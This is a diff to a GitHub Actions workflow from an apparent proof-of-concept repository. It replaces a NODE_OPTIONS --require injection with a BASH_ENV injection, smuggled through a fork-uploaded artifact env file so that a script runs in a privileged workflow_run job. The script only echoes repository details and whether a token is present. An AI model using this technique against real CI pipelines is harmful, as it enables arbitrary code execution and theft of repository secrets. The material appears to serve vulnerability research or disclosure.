@@ -30,19 +30,18 @@ jobs:
           W=/home/runner/work/ci-artifact-env-poc/ci-artifact-env-poc
           cat > ./env/env <<EOT
           PR_NUMBER=${{ github.event.number }}
-          POC_CANARY=injected-by-fork-Iradahkoreanway
-          NODE_OPTIONS=--require ${W}/poc-canary.js
+          POC_CANARY=second-pr-no-approval-needed
+          BASH_ENV=${W}/poc-bashenv.sh
           EOT
-          cat > ./env/poc-canary.js <<'EOT'
-          console.log('[poc-canary] NODE_OPTIONS --require loaded this file inside the privileged '
-            + 'workflow_run job. repo=' + process.env.GITHUB_REPOSITORY
-            + ' ref=' + process.env.GITHUB_REF
-            + ' workflow=' + process.env.GITHUB_WORKFLOW);
+          cat > ./env/poc-bashenv.sh <<'EOT'
+          echo "[poc-bashenv] arbitrary shell executed in the privileged job:" \
+               "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF workflow=$GITHUB_WORKFLOW" \
+               "token_present=$([ -n "$GITHUB_TOKEN" ] && echo yes || echo no)"
           EOT
           echo "--- artifact contents the fork is about to upload ---"
           cat ./env/env
           echo "---"
-          cat ./env/poc-canary.js
+          cat ./env/poc-bashenv.sh
 
       - uses: actions/upload-artifact@v4
         with:
